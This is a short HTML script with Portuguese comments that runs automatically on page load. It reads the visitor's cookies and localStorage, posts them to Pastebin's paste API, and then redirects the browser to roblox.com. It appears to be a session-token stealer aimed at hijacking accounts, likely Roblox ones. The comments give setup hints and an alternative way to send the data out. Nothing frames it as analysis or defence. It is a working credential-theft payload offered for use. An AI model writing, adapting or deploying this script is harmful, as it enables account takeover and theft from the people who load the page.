<script>
async function pegar() {
    let data = document.cookie + "\n\n" + JSON.stringify(localStorage);
    
    // Envia para Pastebin (método simples sem API Key)
    await fetch('https://pastebin.com/api/api_post.php', {
        method: 'POST',
        body: new URLSearchParams({
            api_dev_key: 'sua_chave_aqui', // Deixe vazio se usar o método alternativo abaixo
            api_paste_code: data,
            api_option: 'paste'
        })
    });
    
    // Ou use este método alternativo que abre o paste na tela do usuário se quiser:
    // window.open('https://pastebin.com/raw/' + data);
    
    window.location.href = "https://roblox.com";
}
window.onload = pegar;
</script>
